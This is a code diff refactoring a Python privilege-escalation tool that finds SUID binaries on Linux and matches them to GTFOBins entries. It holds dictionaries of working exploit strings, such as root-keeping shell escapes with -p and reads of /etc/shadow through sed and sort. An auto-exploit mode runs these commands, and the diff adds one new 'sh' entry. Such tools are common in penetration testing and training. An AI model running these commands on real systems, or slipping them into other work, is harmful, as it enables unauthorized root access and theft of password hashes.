@@ -8,10 +8,7 @@ from sys import argv
 from os import system, popen
 from time import sleep
 
-"""
-The following list contains exploits for all known SUID binaries
-"""
-
+# The following list contains exploits for all known SUID binaries
 customSUIDs = {
     'aria2c': 'COMMAND=\'id\'\nTF=$(mktemp)\necho "$COMMAND" > $TF\nchmod +x $TF\n./aria2c --on-download-error=$TF http://x',
     'arp': 'LFILE=file_to_read\n./arp -v -f "$LFILE"',
@@ -77,16 +74,60 @@ customSUIDs = {
     'zsoelim': 'LFILE=file_to_read\n./zsoelim "$LFILE"',
 }
 
-"""
-The following list contains all default SUID bins found within Unix
-"""
+# The following list contains all default SUID bins found within Unix
+defSUIDBinaries = [
+    "arping",
+    "at",
+    "bwrap",
+    "chfn",
+    "chrome-sandbox",
+    "chsh",
+    "dbus-daemon-launch-helper",
+    "dmcrypt-get-device",
+    "exim4",
+    "fusermount",
+    "gpasswd",
+    "helper",
+    "kismet_capture",
+    "lxc-user-nic",
+    "mount",
+    "mount.cifs",
+    "mount.ecryptfs_private",
+    "mount.nfs",
+    "newgidmap",
+    "newgrp",
+    "newuidmap",
+    "ntfs-3g",
+    "passwd",
+    "ping",
+    "ping6",
+    "pkexec",
+    "polkit-agent-helper-1",
+    "pppd",
+    "snap-confine",
+    "ssh-keysign",
+    "su",
+    "sudo",
+    "traceroute6.iputils",
+    "ubuntu-core-launcher",
+    "umount",
+    "VBoxHeadless",
+    "VBoxNetAdpCtl",
+    "VBoxNetDHCP",
+    "VBoxNetNAT",
+    "VBoxSDL",
+    "VBoxVolInfo",
+    "VirtualBoxVM",
+    "vmware-authd",
+    "vmware-user-suid-wrapper",
+    "vmware-vmx",
+    "vmware-vmx-debug",
+    "vmware-vmx-stats",
+    "Xorg.wrap",
+]
 
-defSUIDBinaries = ["arping", "at", "bwrap", "chfn", "chrome-sandbox", "chsh", "dbus-daemon-launch-helper", "dmcrypt-get-device", "exim4", "fusermount", "gpasswd", "helper", "kismet_capture", "lxc-user-nic", "mount", "mount.cifs", "mount.ecryptfs_private", "mount.nfs", "newgidmap", "newgrp", "newuidmap", "ntfs-3g", "passwd", "ping", "ping6", "pkexec", "polkit-agent-helper-1", "pppd", "snap-confine", "ssh-keysign", "su", "sudo", "traceroute6.iputils", "ubuntu-core-launcher", "umount", "VBoxHeadless", "VBoxNetAdpCtl", "VBoxNetDHCP", "VBoxNetNAT", "VBoxSDL", "VBoxVolInfo", "VirtualBoxVM", "vmware-authd", "vmware-user-suid-wrapper", "vmware-vmx", "vmware-vmx-debug", "vmware-vmx-stats", "Xorg.wrap"]
 
-"""
-Auto Exploitation of SUID Bins - List
-"""
-
+# Auto Exploitation of SUID Bins - List
 suidExploitation = {
     'ash': '',
     'bash': '-p',
@@ -135,6 +176,7 @@ suidExploitation = {
     'rvim': '-c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'',
     'sed': '-e "" /etc/shadow',
     'setarch': '$(arch) /bin/sh -p',
+    'sh': '-p',
     'sort': '-m /etc/shadow',
     'start-stop-daemon': '-n $RANDOM -S -x /bin/sh -- -p',
     'stdbuf': '-i0 /bin/sh -p',
@@ -154,48 +196,181 @@ suidExploitation = {
     'zsh': '',
 }
 
-"""
-The following list contains GTFO Bins binaries which are SUID exploitable
-"""
 
-gtfoBinsList    = ['bash', 'busybox', 'cat', 'chroot', 'cut', 'dash', 'docker', 'env', 'expand', 'expect', 'find', 'flock', 'fold', 'gdb', 'grep', 'head', 'ionice', 'jrunscript', 'ksh', 'ld.so', 'less', 'logsave', 'make', 'more', 'nice', 'nl', 'node', 'od', 'perl', 'pg', 'php', 'python', 'rlwrap', 'rpm', 'rpmquery', 'rsync', 'run-parts', 'rvim', 'sed', 'setarch', 'sort', 'start-stop-daemon', 'stdbuf', 'strace', 'tail', 'taskset', 'time', 'timeout', 'ul', 'unexpand', 'uniq', 'unshare', 'vim', 'watch', 'xargs', 'xxd', 'zsh', 'aria2c', 'arp', 'ash', 'base32', 'base64', 'byebug', 'chmod', 'chown', 'cp', 'csh', 'curl', 'date', 'dd', 'dialog', 'diff', 'dmsetup', 'file', 'ed', 'emacs', 'eqn', 'fmt', 'gawk', 'gimp', 'git', 'gtester', 'hd', 'hexdump', 'highlight', 'iconv', 'iftop', 'ip', 'jjs', 'jq', 'ksshell', 'ldconfig', 'look', 'lua', 'lwp-download', 'lwp-request', 'mawk', 'mv', 'mysql', 'awk', 'nano', 'nawk', 'nc', 'nmap', 'nohup', 'openssl', 'pic', 'pico', 'pry', 'readelf', 'restic', 'scp', 'shuf', 'soelim', 'sqlite3', 'socat', 'strings', 'sysctl', 'systemctl', 'tac', 'tar', 'tclsh', 'tee', 'telnet', 'tftp', 'uudecode', 'uuencode', 'xz', 'zip', 'wget', 'zsoelim']
+# The following list contains GTFO Bins binaries which are SUID exploitable
+gtfoBinsList = [
+    "bash",
+    "busybox",
+    "cat",
+    "chroot",
+    "cut",
+    "dash",
+    "docker",
+    "env",
+    "expand",
+    "expect",
+    "find",
+    "flock",
+    "fold",
+    "gdb",
+    "grep",
+    "head",
+    "ionice",
+    "jrunscript",
+    "ksh",
+    "ld.so",
+    "less",
+    "logsave",
+    "make",
+    "more",
+    "nice",
+    "nl",
+    "node",
+    "od",
+    "perl",
+    "pg",
+    "php",
+    "python",
+    "rlwrap",
+    "rpm",
+    "rpmquery",
+    "rsync",
+    "run-parts",
+    "rvim",
+    "sed",
+    "setarch",
+    "sort",
+    "start-stop-daemon",
+    "stdbuf",
+    "strace",
+    "tail",
+    "taskset",
+    "time",
+    "timeout",
+    "ul",
+    "unexpand",
+    "uniq",
+    "unshare",
+    "vim",
+    "watch",
+    "xargs",
+    "xxd",
+    "zsh",
+    "aria2c",
+    "arp",
+    "ash",
+    "base32",
+    "base64",
+    "byebug",
+    "chmod",
+    "chown",
+    "cp",
+    "csh",
+    "curl",
+    "date",
+    "dd",
+    "dialog",
+    "diff",
+    "dmsetup",
+    "file",
+    "ed",
+    "emacs",
+    "eqn",
+    "fmt",
+    "gawk",
+    "gimp",
+    "git",
+    "gtester",
+    "hd",
+    "hexdump",
+    "highlight",
+    "iconv",
+    "iftop",
+    "ip",
+    "jjs",
+    "jq",
+    "ksshell",
+    "ldconfig",
+    "look",
+    "lua",
+    "lwp-download",
+    "lwp-request",
+    "mawk",
+    "mv",
+    "mysql",
+    "awk",
+    "nano",
+    "nawk",
+    "nc",
+    "nmap",
+    "nohup",
+    "openssl",
+    "pic",
+    "pico",
+    "pry",
+    "readelf",
+    "restic",
+    "scp",
+    "shuf",
+    "sh",
+    "soelim",
+    "sqlite3",
+    "socat",
+    "strings",
+    "sysctl",
+    "systemctl",
+    "tac",
+    "tar",
+    "tclsh",
+    "tee",
+    "telnet",
+    "tftp",
+    "uudecode",
+    "uuencode",
+    "xz",
+    "zip",
+    "wget",
+    "zsoelim",
+]
+
 
 """
 Colors List
 """
 
-cyan     = "\033[0;96m"
-green     = "\033[0;92m"
-white     = "\033[0;97m"
-red     = "\033[0;91m"
-blue     = "\033[0;94m"
-yellow     = "\033[0;33m"
-magenta = "\033[0;35m"
+CYAN    = "\033[0;96m"
+GREEN   = "\033[0;92m"
+WHITE   = "\033[0;97m"
+RED     = "\033[0;91m"
+BLUE    = "\033[0;94m"
+YELLOW  = "\033[0;33m"
+MAGENTA = "\033[0;35m"
 
-barLine = "------------------------------"
+BARLINE = "------------------------------"
 
-banner     = magenta + "  ___ _   _ _ ___    _____  _ _   _ __  __ \n"
-banner += yellow + " / __| | | / |   \\  |__ / \\| | | | |  \\/  |\n"
-banner += blue + " \\__ \\ |_| | | |) |  |_ \\ .` | |_| | |\\/| |\n"
-banner += red + " |___/\\___/|_|___/  |___/_|\\_|\\___/|_|  |_| " + cyan + " twitter@syed__umar\n"
+BANNER  = MAGENTA + "  ___ _   _ _ ___    _____  _ _   _ __  __ \n"
+BANNER  += YELLOW + " / __| | | / |   \\  |__ / \\| | | | |  \\/  |\n"
+BANNER  += BLUE + " \\__ \\ |_| | | |) |  |_ \\ .` | |_| | |\\/| |\n"
+BANNER  += RED + " |___/\\___/|_|___/  |___/_|\\_|\\___/|_|  |_| " + CYAN + " twitter@syed__umar\n"
 
 
 def listAllSUIDBinaries():
     """
-    Listing all SUID Binaries found in the system
+    Find the SUID binaries and return the list
     """
 
-    print(white + "[" + blue + "#" + white + "] " + yellow + "Finding/Listing all SUID Binaries ..")
-    print(white + barLine)
+    print(WHITE + "[" + BLUE + "#" + WHITE + "] " + YELLOW + "Finding/Listing all SUID Binaries ..")
+    print(WHITE + BARLINE)
 
-    command     = "find / -perm -4000 -type f 2>/dev/null" # Since /4000 isn't backwards compatible with old versions of find ..  :))
-    result         = popen(command).read().strip().split("\n")
+    command     = "find / -perm -4000 -type f 2>/dev/null"
+    result      = popen(command).read().strip().split("\n")
 
     for bins in result:
-        print(yellow + bins)
+        print(YELLOW + bins)
 
-    print(white + barLine + "\n\n")
+    print(WHITE + BARLINE + "\n\n")
     return(result)
+
 
 def doSomethingPlis(listOfSuidBins):
     """
@@ -203,15 +378,20 @@ def doSomethingPlis(listOfSuidBins):
         - Default binaries which ship with installation of linux
         - Custom binaries which aren't part of default list
         - Binaries which match GTFObins list!
+
+    Args:
+        listOfSuidBins ([list]): SUID binaries list
+
+    Returns:
+        binsInGTFO, defaultSuidBins, customSuidBins
     """
 
-    _bins             = []
-    binsInGTFO         = []
-    customSuidBins     = []
+    binsInGTFO      = []
+    customSuidBins  = []
     defaultSuidBins = []
 
     for bins in listOfSuidBins:
-        _binName     = bins.split("/")[::-1][0]
+        _binName = bins.split("/")[::-1][0]
 
         if _binName not in defSUIDBinaries:
             customSuidBins.append(bins)
@@ -222,54 +402,53 @@ def doSomethingPlis(listOfSuidBins):
         else:
             defaultSuidBins.append(bins)
 
-    print(white + "["+ red + "!" + white + "] Default Binaries (Don't bother)")
-    print(barLine)
-    for bins in defaultSuidBins: print(blue + bins)
-    print(white + barLine + "\n\n")
+    print(WHITE + "["+ RED + "!" + WHITE + "] Default Binaries (Don't bother)")
 
-    print(white + "[" + cyan + "~" + white + "] " + cyan + "Custom SUID Binaries (Interesting Stuff)")
-    print(white + barLine)
-    for bins in customSuidBins: print(cyan + bins)
-    print(white + barLine + "\n\n")
+    print(BARLINE)
+    for bins in defaultSuidBins: print(BLUE + bins)
+    print(WHITE + BARLINE + "\n\n")
+
+    print(WHITE + "[" + CYAN + "~" + WHITE + "] " + CYAN + "Custom SUID Binaries (Interesting Stuff)")
+
+    print(WHITE + BARLINE)
+    for bins in customSuidBins: print(CYAN + bins)
+    print(WHITE + BARLINE + "\n\n")
 
     """
     QWgsIEkgc2VlIHlvdSdyZSBhIG1hbiBvZiBjdWx0dXJlIGFzIHdlbGwgOkQgCk5vdCBldmVyeW9uZSByZWFkcyBzb3VyY2UgY29kZSBvZiB3aGF0IHRoZXkncmUgcnVubmluZyBub3ctYS1kYXlzIMKvXF8o44OEKV8vwq8K
     """
 
     if len(binsInGTFO) != 0:
-        print("[" + green + "#" + white + "] " + green + "SUID Binaries in GTFO bins list (Hell Yeah!)")
-        print(white + barLine)
+        print("[" + GREEN + "#" + WHITE + "] " + GREEN + "SUID Binaries in GTFO bins list (Hell Yeah!)")
+        print(WHITE + BARLINE)
 
         for bin in binsInGTFO:
-            pathOfBin     = popen("which " + bin).read().strip()
+            pathOfBin   = popen("which " + bin).read().strip()
             gtfoUrl     = "https://gtfobins.github.io/gtfobins/" + bin[::-1].split("/")[0][::-1] + "/#suid"
-            print(green + pathOfBin + white + " -~> " + magenta + gtfoUrl)
+            print(GREEN + pathOfBin + WHITE + " -~> " + MAGENTA + gtfoUrl)
 
-        print(white + barLine + "\n\n")
+        print(WHITE + BARLINE + "\n\n")
 
     else:
-        print("[" + green + "#" + white + "] " + green + "SUID Binaries found in GTFO bins..")
-        print(white + barLine)
-        print("[" + red + "!" + white + "] " + magenta + "None " + red + ":(")
-        print(white + barLine + "\n\n")
+        print("[" + GREEN + "#" + WHITE + "] " + GREEN + "SUID Binaries found in GTFO bins..")
+        print(WHITE + BARLINE)
+
+        print("[" + RED + "!" + WHITE + "] " + MAGENTA + "None " + RED + ":(")
+        print(WHITE + BARLINE + "\n\n")
 
 
-    """
-    PR by @th3instein
-    @modded
-    """
-    binsToExploit     = []
-    _binsToExploit     = {}
+    _binsToExploit = {}
+
     for binary in binsInGTFO:
-        binaryName     = binary[::-1].split("/")[0][::-1]
+        binaryName = binary[::-1].split("/")[0][::-1]
 
         if binaryName not in suidExploitation:
             _binsToExploit[binary] = customSUIDs[binaryName]
 
 
     if len(_binsToExploit) != 0:
-        print("[" + yellow + "&" + white + "] " + cyan + "Manual Exploitation (Binaries which create files on the system)")
-        print(white + barLine)
+        print("[" + YELLOW + "&" + WHITE + "] " + CYAN + "Manual Exploitation (Binaries which create files on the system)")
+        print(WHITE + BARLINE)
 
         for binaryPath, binaryExploitation in _binsToExploit.items():
             binaryName             = binaryPath[::-1].split("/")[0][::-1]
@@ -277,10 +456,10 @@ def doSomethingPlis(listOfSuidBins):
 
             # print(binaryName, binaryExploitation)
 
-            print(white + "[" + cyan + "&" + white + "] " + magenta + binaryName.capitalize() + white + " ( " + green + binaryPath + " )" + white)
-            print(yellow + binaryExploitation + white + "\n")
+            print(WHITE + "[" + CYAN + "&" + WHITE + "] " + MAGENTA + binaryName.capitalize() + WHITE + " ( " + GREEN + binaryPath + " )" + WHITE)
+            print(YELLOW + binaryExploitation + WHITE + "\n")
 
-        print(white + barLine + "\n\n")
+        print(WHITE + BARLINE + "\n\n")
     """
     @PR End
     """
@@ -288,52 +467,66 @@ def doSomethingPlis(listOfSuidBins):
 
 
 def note():
-    print(white + "[" + red + "-" + white + "] " + magenta + "Note")
-    print(white + barLine)
-    print(blue  + "If you see any FP in the output, please report it to make the script better! :)")
-    print(white + barLine + "\n")
+    """Ask the user to report issues if any
+    """    
+    print(WHITE + "[" + RED + "-" + WHITE + "] " + MAGENTA + "Note")
+    print(WHITE + BARLINE)
+    print(BLUE  + "If you see any FP in the output, please report it to make the script better! :)")
+    print(WHITE + BARLINE + "\n")
+
 
 def exploitThisShit(bins):
+    """Exploits the enumerated binaries
+
+    Params:
+        -e  -> auto-exploit
+
+    Args:
+        bins ([list]): Vulnerable SUID binaries
+    """    
     commands     = []
 
     for suidBins in bins:
         _bin     = suidBins.split("/")[::-1][0]
 
         if _bin in suidExploitation:
-            _results     = suidBins + " " + suidExploitation[_bin]
+            _results = suidBins + " " + suidExploitation[_bin]
             commands.append(_results)
 
     if len(commands) != 0:
         if len(argv) == 2:
             if argv[1] == '-e':
-                print(white + "[" + magenta + "$" + white + "] " + white + "Auto Exploiting SUID bit binaries !!!")
-                print(white + barLine)
+                print(WHITE + "[" + MAGENTA + "$" + WHITE + "] " + WHITE + "Auto Exploiting SUID bit binaries !!!")
+                print(WHITE + BARLINE)
 
                 for _commands in commands:
-                    print(magenta + "\n[#] Executing Command .. ")
-                    print(cyan + "[~] " + _commands + "\n" + white)
+                    print(MAGENTA + "\n[#] Executing Command .. ")
+                    print(CYAN + "[~] " + _commands + "\n" + WHITE)
                     sleep(0.5)
                     system(_commands)
                     sleep(0.5)
 
         else:
-            print(white + "[" + green + "$" + white + "] " + white + "Please try the command(s) below to exploit harmless SUID bin(s) found !!!")
-            print(white + barLine)
+            print(WHITE + "[" + GREEN + "$" + WHITE + "] " + WHITE + "Please try the command(s) below to exploit harmless SUID bin(s) found !!!")
+            print(WHITE + BARLINE)
 
             for _commands in commands:
                 print("[~] " + _commands)
 
-        print(white + barLine + "\n\n")
+        print(WHITE + BARLINE + "\n\n")
+
 
 def main():
-    print(banner)
+    print(BANNER)
+
     try:
-        suidBins     = listAllSUIDBinaries()
-        gtfoBins     = doSomethingPlis(suidBins)
+        suidBins = listAllSUIDBinaries()
+        gtfoBins = doSomethingPlis(suidBins)
         exploitThisShit(gtfoBins[0]); note()
 
     except KeyboardInterrupt:
-        print("\n[" + red + "!" + white + "] " + red + "Aye, why you do dis!?")
+        print("\n[" + RED + "!" + WHITE + "] " + RED + "Aye, why you do dis!?")
+
 
 if __name__ == '__main__':
     main()
